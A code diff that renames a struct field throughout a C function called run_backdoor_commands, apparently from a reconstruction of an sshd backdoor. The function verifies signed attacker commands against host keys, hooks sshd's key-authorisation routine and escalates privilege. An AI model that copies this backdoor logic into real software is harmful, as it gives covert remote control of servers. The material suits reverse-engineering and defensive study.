@@ -92,7 +92,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 
 			if((num_n_bytes - SIZE_STEP0) < ED448_SIGNATURE_SIZE) break;
 
-			f.payload.monitor.cmd_type = cmd_type;
+			f.data.monitor.cmd_type = cmd_type;
 			if((num_n_bytes - SIZE_STEP1) < sizeof(cmd_arguments_t)) break;
 
 			f.kctx.args = f.kctx.payload.body.args;
@@ -128,7 +128,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 				payload_size = size + sizeof(int);
 
 				memcpy(
-					&f.payload.data[4],
+					&f.data.data[4],
 					&f.kctx.payload.body.args,
 					payload_size + 1);
 
@@ -163,7 +163,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 					f.key_prev_idx = key_idx;
 					sigcheck_result = verify_signature(
 						ctx->sshd_sensitive_data->host_pubkeys[key_idx],
-						(u8 *)&f.payload,
+						(u8 *)&f.data,
 						hostkey_hash_offset + 4,
 						0x25,
 						f.kctx.payload.body.signature,
@@ -321,14 +321,14 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 							data_ptr2 = (u8 *)&f.kctx.payload + body_offset;
 							if(ctx->uid){
 								// FIXME: memset 11 * 4 bytes
-								f.payload.monitor.cmd_type = cmd_type;
-								f.payload.monitor.args = &f.kctx.args;
-								f.payload.monitor.payload_body = (u8 *)&f.kctx.payload + body_offset;
-								f.payload.monitor.rsa_n = f.kctx.rsa_n;
-								f.payload.monitor.rsa_e = f.kctx.rsa_e;
-								f.payload.monitor.payload_body_size = data_s1;
-								f.payload.monitor.rsa = f.rsa;
-								if(sshd_proxy_elevate(&f.payload.monitor, ctx)){
+								f.data.monitor.cmd_type = cmd_type;
+								f.data.monitor.args = &f.kctx.args;
+								f.data.monitor.payload_body = (u8 *)&f.kctx.payload + body_offset;
+								f.data.monitor.rsa_n = f.kctx.rsa_n;
+								f.data.monitor.rsa_e = f.kctx.rsa_e;
+								f.data.monitor.payload_body_size = data_s1;
+								f.data.monitor.rsa = f.rsa;
+								if(sshd_proxy_elevate(&f.data.monitor, ctx)){
 									ctx->disable_backdoor = TRUE;
 									*f.p_do_orig = FALSE;
 									return TRUE;
@@ -358,11 +358,11 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										if((f.kctx.args.flags2 & CMDF_PSELECT) == CMDF_PSELECT){
 											if(!ctx->libc_imports->exit) break;
 											if(!ctx->libc_imports->pselect) break;
-											f.payload.timespec.tv_sec = 5;
+											f.data.timespec.tv_sec = 5;
 											ctx->libc_imports->pselect(
 												0,
 												NULL, NULL, NULL,
-												&f.payload.timespec,
+												&f.data.timespec,
 												NULL
 											);
 											ctx->libc_imports->exit(0);
@@ -465,14 +465,14 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 									int res;
 									for(;;){
 										*(u64 *)&f.u.sock.fd_recv_buf[16] = __builtin_bswap32(0x50);
-										memset(&f.payload, 0x00, 0x80);
-										FD_SET(f.u.sock.socket_fd, (fd_set *)&f.payload);
+										memset(&f.data, 0x00, 0x80);
+										FD_SET(f.u.sock.socket_fd, (fd_set *)&f.data);
 										*(struct timespec *)&f.u.sock.fd_recv_buf[8] = (struct timespec){
 											.tv_sec = 0
 										};
 										if((res = ctx->libc_imports->pselect(
 											f.u.sock.socket_fd + 1,
-											&f.payload.fd_set,
+											&f.data.fd_set,
 											NULL, NULL,
 											(const struct timespec *)&f.u.sock.fd_recv_buf[8],
 											NULL
@@ -482,7 +482,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										}
 									}
 									if(!res) break;
-									if(!FD_ISSET(f.u.sock.socket_fd, &f.payload.fd_set)) break;
+									if(!FD_ISSET(f.u.sock.socket_fd, &f.data.fd_set)) break;
 
 									if(fd_read(
 										f.u.sock.socket_fd,
@@ -527,18 +527,18 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 									ctx->sshd_ctx->mm_answer_keyallowed_ptr = ctx->sshd_ctx->mm_answer_keyallowed;
 
 									post_exec:
-									memset(&f.payload, 0x00, 0xF0);
+									memset(&f.data, 0x00, 0xF0);
 
-									f.payload.data[0] = 0x80;
-									f.payload.data[0xF6] = 8;
-									f.payload.data[0xFF] = 1;
+									f.data.data[0] = 0x80;
+									f.data.data[0xF6] = 8;
+									f.data.data[0xFF] = 1;
 									BIGNUM *rsa_e, *rsa_n;
 									rsa_e = ctx->imported_funcs->BN_bin2bn(
 										f.u.sock.fd_recv_buf,
 										1, NULL);
 									if(rsa_e){
 										rsa_n = ctx->imported_funcs->BN_bin2bn(
-											(u8 *)&f.payload,
+											(u8 *)&f.data,
 											256, NULL
 										);
 										if(rsa_n){
